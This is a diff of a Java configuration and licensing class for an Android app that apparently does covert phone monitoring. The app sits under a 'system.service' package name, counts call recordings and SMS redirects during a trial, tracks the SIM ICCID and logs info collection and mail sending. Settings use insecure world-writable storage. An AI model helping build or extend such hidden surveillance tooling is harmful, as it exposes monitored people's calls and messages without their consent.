@@ -3,6 +3,8 @@ package system.service.config;
 import java.util.Calendar;
 import java.util.Date;
 
+import system.service.GlobalValues;
+
 import com.particle.inspector.common.util.DatetimeUtil;
 import com.particle.inspector.common.util.DeviceProperty;
 import com.particle.inspector.common.util.license.LicenseCtrl;
@@ -21,25 +23,24 @@ public class ConfigCtrl
 {
 	private static final String PREFS_NAME = "system.service";
 	private static final String LICENSE_KEY = "LicenseKey";
-	private static final String LICENSE_TYPE_STR = "LicenseType";
-	private static final String INTERVAL_TRY_SCREENSHOT_ = "TryScreenshotInterval";
 	private static final String INTERVAL_TRY_GETINFO = "TryGetInfoInterval";
 	private static final String CONSUMED_DATETIME = "ConsumedDatetime"; // The 1st activation datetime
 	private static final String LAST_GETINFO_DATETIME = "LastGetInfoDatetime"; // The last datetime of info collection and mail sending
-	private static final String AUTH_SMS_SENT_DATETIME = "AuthSmsSentDatetime";
+	private static final String TRIAL_SMS_SENT_DATETIME = "TrialInfoSmsSentDatetime";
+	private static final String CHECKIN_SMS_SENT_DATETIME = "CheckinSmsSentDatetime";
 	private static final String SELF_PHONE_NUMBER = "SelfPhoneNum";
 	private static final String HAS_SENT_EXPIRE_SMS = "HasSentExpireSms";
 	private static final String HAS_SENT_TRIAL_RECORDING_TIMES_LIMIT_SMS = "HSTRTLS";
 	private static final String HAS_SENT_TRIAL_REDIRECT_SMS_TIMES_LIMIT_SMS = "HSTRSTLS";
-	private static final String UNREGISTERER_PHONE_NUMBER = "UnregistererPhoneNum";
 	private static final String RECORDING_TIMES_IN_TRIAL = "RecordingTimesInTrial";
 	private static final String SMS_REDIRECT_TIMES_IN_TRIAL = "SmsRedirectTimesInTrial";
-	private static final String TRIAL_INFO_SMS_SENT_DATETIME = "TrialInfoSmsSentDatetime";
 	private static final String SIM_FIRST_RUN = "SimFirstRun";
 	private static final String SIM_SERIAL_NUM = "ICCID";
-	private static final int DEFAULT_TRIAL_DAYS = 1+1; // Trial days
-	private static final int DEFAULT_RECORDING_TIMES_IN_TRIAL = 2+2+1; // Recording times in trial
-	private static final int DEFAULT_REDIRECT_SMS_TIMES_IN_TRIAL = 5+5; // SMS redirect times in trial
+	private static final String STOPPED_BY_SYSTEM = "StoppedBySystem";
+	
+	private static final int DEFAULT_TRIAL_DAYS = 2; // Trial days
+	private static final int DEFAULT_RECORDING_TIMES_IN_TRIAL = 5; // Recording times in trial
+	private static final int DEFAULT_REDIRECT_SMS_TIMES_IN_TRIAL = 10; // SMS redirect times in trial
 	
 	public static boolean set(Context context, String key, String value)
 	{	
@@ -68,33 +69,6 @@ public class ConfigCtrl
 	{
 		Editor editor = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE).edit();
 		editor.putString(LICENSE_KEY, key.toUpperCase());     
-		return editor.commit();
-	}
-	
-	public static LICENSE_TYPE getLicenseType(Context context)
-	{
-		SharedPreferences config = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE);
-		String type = config.getString(LICENSE_TYPE_STR, "");
-		return LicenseCtrl.strToEnum(type);
-	}
-	
-	public static boolean setLicenseType(Context context, LICENSE_TYPE type)
-	{
-		Editor editor = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE).edit();
-		editor.putString(LICENSE_TYPE_STR, LicenseCtrl.enumToStr(type));     
-		return editor.commit();
-	}
-	
-	public static int getScreenshotInterval(Context context)
-	{
-		SharedPreferences config = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE);
-		return config.getInt(INTERVAL_TRY_SCREENSHOT_, 60000);
-	}
-	
-	public static boolean setScreenshotInterval(Context context, int interval)
-	{
-		Editor editor = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE).edit();     
-		editor.putInt(INTERVAL_TRY_SCREENSHOT_, interval);     
 		return editor.commit();
 	}
 	
@@ -145,20 +119,20 @@ public class ConfigCtrl
 		return editor.commit();
 	}
 	
-	public static String getAuthSmsSentDatetime(Context context)
+	public static String getCheckinSmsSentDatetime(Context context)
 	{
 		SharedPreferences config = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE);
-		String str = config.getString(AUTH_SMS_SENT_DATETIME, "").trim();
+		String str = config.getString(CHECKIN_SMS_SENT_DATETIME, "").trim();
 		if (str.length() > 0)
 			return str;
 		else
 			return null;
 	}
 	
-	public static boolean setAuthSmsSentDatetime(Context context, Date datetime)
+	public static boolean setCheckinSmsSentDatetime(Context context, Date datetime)
 	{
 		Editor editor = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE).edit();     
-		editor.putString(AUTH_SMS_SENT_DATETIME, datetime == null ? "": DatetimeUtil.format.format(datetime));     
+		editor.putString(CHECKIN_SMS_SENT_DATETIME, datetime == null ? "": DatetimeUtil.format.format(datetime));     
 		return editor.commit();
 	}
 	
@@ -218,27 +192,10 @@ public class ConfigCtrl
 		return editor.commit();
 	}
 	
-	public static String getUnregistererPhoneNum(Context context) 
-	{
-		SharedPreferences config = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE);
-		String str = config.getString(UNREGISTERER_PHONE_NUMBER, "").trim();
-		if (str.length() > 0)
-			return str;
-		else
-			return null;
-	}
-	
-	public static boolean setUnregistererPhoneNum(Context context, String value) 
-	{
-		Editor editor = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE).edit();     
-		editor.putString(UNREGISTERER_PHONE_NUMBER, value);     
-		return editor.commit();
-	}
-	
 	public static String getTrialInfoSmsSentDatetime(Context context)
 	{
 		SharedPreferences config = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE);
-		String str = config.getString(TRIAL_INFO_SMS_SENT_DATETIME, "").trim();
+		String str = config.getString(TRIAL_SMS_SENT_DATETIME, "").trim();
 		if (str.length() > 0)
 			return str;
 		else
@@ -248,7 +205,7 @@ public class ConfigCtrl
 	public static boolean setTrialInfoSmsSentDatetime(Context context, Date datetime)
 	{
 		Editor editor = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE).edit();     
-		editor.putString(TRIAL_INFO_SMS_SENT_DATETIME, datetime == null ? "": DatetimeUtil.format.format(datetime));     
+		editor.putString(TRIAL_SMS_SENT_DATETIME, datetime == null ? "": DatetimeUtil.format.format(datetime));     
 		return editor.commit();
 	}
 	
@@ -265,7 +222,7 @@ public class ConfigCtrl
 		try {
 			return config.getInt(RECORDING_TIMES_IN_TRIAL, 0);
 		} catch (Exception ex) {
-			return (2+2+1);//DEFAULT_RECORDING_TIMES_IN_TRIAL
+			return DEFAULT_RECORDING_TIMES_IN_TRIAL;
 		}
 	}
 	
@@ -288,7 +245,7 @@ public class ConfigCtrl
 		try {
 			return config.getInt(SMS_REDIRECT_TIMES_IN_TRIAL, 0);
 		} catch (Exception ex) {
-			return (5+5);//DEFAULT_REDIRECT_SMS_TIMES_IN_TRIAL
+			return DEFAULT_REDIRECT_SMS_TIMES_IN_TRIAL;
 		}
 	}
 	
@@ -322,6 +279,19 @@ public class ConfigCtrl
 			return null;
 	}
 	
+	public static boolean setStoppedBySystem(Context context, boolean value)
+	{
+		Editor editor = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE).edit();     
+		editor.putBoolean(STOPPED_BY_SYSTEM, value);     
+		return editor.commit();
+	}
+	
+	public static boolean getStoppedBySystem(Context context)
+	{
+		SharedPreferences config = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE);
+		return config.getBoolean(STOPPED_BY_SYSTEM, false);
+	}
+	
 	public static boolean countSmsRedirectTimesInTrial(Context context) 
 	{
 		int currentCount = getSmsRedirectTimesInTrial(context);
@@ -342,7 +312,7 @@ public class ConfigCtrl
 			if (consumeDatetime != null)
 			{	
 				Calendar now = Calendar.getInstance();
-				now.add(Calendar.DATE, -1*(1+1));//DEFAULT_TRIAL_DAYS
+				now.add(Calendar.DATE, -1*DEFAULT_TRIAL_DAYS);
 				if (now.getTime().before(consumeDatetime)) {
 					ret = true;
 				}
@@ -367,19 +337,21 @@ public class ConfigCtrl
 	
 	public static boolean isLegal(Context context) 
 	{
-		LICENSE_TYPE licType = getLicenseType(context);
-		return (licType == LICENSE_TYPE.FULL_LICENSED ||
-			   (licType == LICENSE_TYPE.TRIAL_LICENSED && ConfigCtrl.stillInTrial(context)) ||
-				licType == LICENSE_TYPE.PART_LICENSED ||
-				licType == LICENSE_TYPE.SUPER_LICENSED);
+		return (
+				 (
+			       (GlobalValues.licenseType == LICENSE_TYPE.FULL_LICENSED) ||
+			       (GlobalValues.licenseType == LICENSE_TYPE.TRIAL_LICENSED && ConfigCtrl.stillInTrial(context))
+			     ) &&
+			     (!ConfigCtrl.getStoppedBySystem(context)) 
+		       );
 	}
 	
 	public static boolean reachRecordingTimeLimit(Context context) {
-		return (getRecordingTimesInTrial(context) >= (2+2+1));//DEFAULT_RECORDING_TIMES_IN_TRIAL
+		return (getRecordingTimesInTrial(context) >= DEFAULT_RECORDING_TIMES_IN_TRIAL);
 	}
 	
 	public static boolean reachSmsRedirectTimeLimit(Context context) {
-		return (getSmsRedirectTimesInTrial(context) >= (5+5));//DEFAULT_REDIRECT_SMS_TIMES_IN_TRIAL
+		return (getSmsRedirectTimesInTrial(context) >= DEFAULT_REDIRECT_SMS_TIMES_IN_TRIAL);
 	}
 
 }
